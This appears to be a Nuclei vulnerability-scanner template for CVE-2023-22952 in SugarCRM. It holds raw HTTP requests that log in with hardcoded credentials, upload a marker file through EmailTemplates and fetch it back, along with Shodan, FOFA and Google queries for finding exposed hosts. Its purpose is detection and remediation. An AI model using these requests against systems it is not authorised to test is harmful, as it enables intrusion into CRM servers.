flow: http(1) && http(2) && http(3)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - You must specify a valid username and password
  raw:
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    module=Users&action=Authenticate&user_name=brenda&user_password=DbLiL98a

    '
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - '["cache\/images\/{{randstr}}.txt"]'
  raw:
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15
    (KHTML, like Gecko) Version/15.2 Safari/605.1.15

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWeTJtA8WByYIQMGR

    Connection: close


    ------WebKitFormBoundaryWeTJtA8WByYIQMGR

    Content-Disposition: form-data; name="action"


    AttachFiles

    ------WebKitFormBoundaryWeTJtA8WByYIQMGR

    Content-Disposition: form-data; name="module"


    EmailTemplates

    ------WebKitFormBoundaryWeTJtA8WByYIQMGR

    Content-Disposition: form-data; name="file"; filename="{{randstr}}.txt"

    Content-Type: image/png


    {{ base64_decode(''iVBORw0KGgoAAAANSUhEUgAAAAUAAAAUBAMAAAC3y+roAAAAD1BMVEVDVkUtMjAyMy0yMjk1MiA7qbPWAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAEUlEQVQImWNgAAJGZQcGKgEAHPkAZVUOitsAAAAASUVORK5CYII='')}}

    ------WebKitFormBoundaryWeTJtA8WByYIQMGR--'
- matchers:
  - part: body
    type: word
    words:
    - CVE-2023-22952
  - part: header
    type: word
    words:
    - text/plain
  matchers-condition: and
  raw:
  - 'GET /cache/images/{{randstr}}.txt HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-22952
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:sugarcrm:sugarcrm:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-22952
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-20,CWE-94
    epss-percentile: 0.99772
    epss-score: 0.93075
  description: 'In SugarCRM before 12.0. Hotfix 91155, a crafted request can inject
    custom PHP code through the EmailTemplates because of missing input validation.

    '
  impact: 'Authenticated attackers can inject custom PHP code through EmailTemplates
    to execute arbitrary commands on the SugarCRM server, potentially compromising
    customer relationship data and business intelligence information.

    '
  metadata:
    fofa-query:
    - body="sugarcrm inc. all rights reserved"
    - title="sugar setup wizard"
    - title=sugarcrm
    google-query:
    - intext:"sugarcrm inc. all rights reserved"
    - intitle:"sugar setup wizard"
    - intitle:sugarcrm
    product: sugarcrm
    shodan-query:
    - http.html:"sugarcrm inc. all rights reserved"
    - http.title:"sugar setup wizard"
    - http.title:"sugarcrm"
    vendor: sugarcrm
  name: SugarCRM Unauthenticated - Remote Code Execution
  reference:
  - https://attackerkb.com/topics/E486ui94II/cve-2023-22952
  remediation: 'Update SugarCRM to version 12.0 Hotfix 91155 or later that implements
    proper input validation for EmailTemplates.

    '
  severity: high
  tags: cve,cve2023,sugarcrm,rce,file-upload,intrusive,kev,vkev,vuln
